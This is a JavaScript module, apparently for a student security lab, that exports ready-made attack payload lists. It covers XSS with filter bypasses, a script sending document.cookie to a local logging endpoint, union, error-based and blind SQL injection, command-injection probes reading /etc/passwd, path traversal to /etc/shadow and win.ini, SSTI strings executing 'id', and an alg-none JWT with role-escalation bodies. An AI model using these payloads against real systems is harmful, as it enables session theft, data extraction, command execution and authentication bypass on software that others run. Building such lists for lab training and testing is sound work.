// ============================================================================
//  CUSTOM PAYLOADS — ชุดเพย์โหลดเจาะลึกระดับแอดวานซ์สำหรับนักศึกษา (AMSTA Lab)
// ============================================================================

/** @type {Record<string, string[]>} */
export const CUSTOM_PAYLOADS = {
  // ── XSS (Cross-Site Scripting - Advanced & Filter Bypass) ────────────────
  xss: [
    "<svg onload=alert(9173)>",
    "\"><img src=x onerror=alert(9173)>",
    "';confirm(9173)//",
    "<script>fetch('http://127.0.0.1:3003/log?cookie='+btoa(document.cookie))</script>",
    "\"><svg/onload=eval(atob('YWxlcnQoOTE3Myk='))>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(9173)>",
    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoOTE3Myk+Pg==",
    "<body onload=alert(9173)>",
    "\"><iframe src=\"javascript:alert(9173)\"></iframe>",
  ],

  // ── SQL injection (SQLi - Union, Error-based & Blind) ───────────────────
  sqli: [
    "' OR '1'='1'-- -",
    "\" OR \"1\"=\"1\" -- -",
    "' UNION SELECT null, version(), user(), database()-- -",
    "1' AND (SELECT 9173 FROM (SELECT(SLEEP(2)))a)-- -",
    "' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
    "admin' AND 1=0 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -",
    "' OR IF(1=1, BENCHMARK(1000000,SHA1('9173')), 0)-- -",
    "') OR ('1'='1",
  ],

  // ── Command injection (OS Command Execution Probes) ─────────────────────
  command_injection: [
    "; id;",
    "| uname -a",
    "`cat /etc/passwd`",
    "$(whoami)",
    "& ping -c 1 127.0.0.1 &",
    "; cat /sdcard/download/flag.txt",
    "|| cat /etc/hosts ||",
    "\n id \n",
    "; cat /proc/version",
  ],

  // ── Path traversal / LFI (Local File Inclusion) ─────────────────────────
  path_traversal: [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/proc/self/environ",
    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "../../../../../../../../etc/shadow",
  ],

  // ── SSTI (Server-Side Template Injection) ──────────────────────────────
  ssti: [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "*{7*7}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
  ],

  // ── หมวดเพิ่มเติม: API / Auth Bypass / JWT / Mobile Deep Testing ────────
  api_auth_bypass: [
    "{\"role\": \"admin\"}",
    "{\"isAdmin\": true}",
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn9.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "' OR 1=1 LIMIT 1 -- -",
    "admin' AND 1=0 UNION SELECT 'admin",
    "{\"sub\": 1, \"iat\": 1516239022, \"role\": \"superuser\"}",
  ],
};